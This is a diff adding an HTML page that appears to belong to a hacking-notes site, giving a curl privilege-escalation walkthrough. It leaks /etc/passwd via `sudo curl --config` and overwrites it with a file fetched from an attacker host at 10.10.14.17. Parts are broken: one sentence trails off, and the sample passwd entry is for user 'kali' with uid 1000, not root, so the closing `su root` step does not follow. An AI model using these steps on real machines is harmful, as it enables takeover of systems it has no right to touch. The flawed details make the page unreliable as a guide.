@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Curl</h1>
+            <p>curl, short for “client URL,” is a command line tool used to transfer data to a specific server through its URL</p>
+        </div>
+        <div class="notion-body">
+            <h2>File Leak</h2>
+            <ul>
+                <p>Curl allow us to load a config file using the <b>flag -K | --config</b></p>
+                <p>Even though this seems fine you can perform... and /etc/passwd file will be prompted in the terminal</p>
+                <pre><code class="language-bash">sudo curl --config /etc/passwd</code></pre>
+                <p>Even though this seems inoffensive you can attempt to replace the /etc/passwd of the victims machine, follow the steps</p>
+                <ul>
+                    <p>Generate an openssl password and hardcode it into the /etc/passwd file</p>
+                    <pre><code class="language-bash">openssl passwd</code></pre>
+                    <p>Copy the passwd from the victim, modify the first line adding the password into the X field and host the file using a web server with python</p>
+                    <pre><code class="language-bash">kali:YOUR_HASHED_PASSWORD_HERE:1000:1000:,,,:/home/kali:/usr/bin/zsh</code></pre>
+                    <p>Finally perform a curl from the victim computer gathering the file you are hosting and export the content into the real /etc/passwd file</p> 
+                    <pre><code class="language-bash">curl http://10.10.14.17/passwd -o /etc/passwd</code></pre>
+                    <p>In order to check if the real /etc/passwd was modified you can list the contents of the file and finally perform a <b>su root</b> and passing the password you just created to login</p>
+                </ul>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
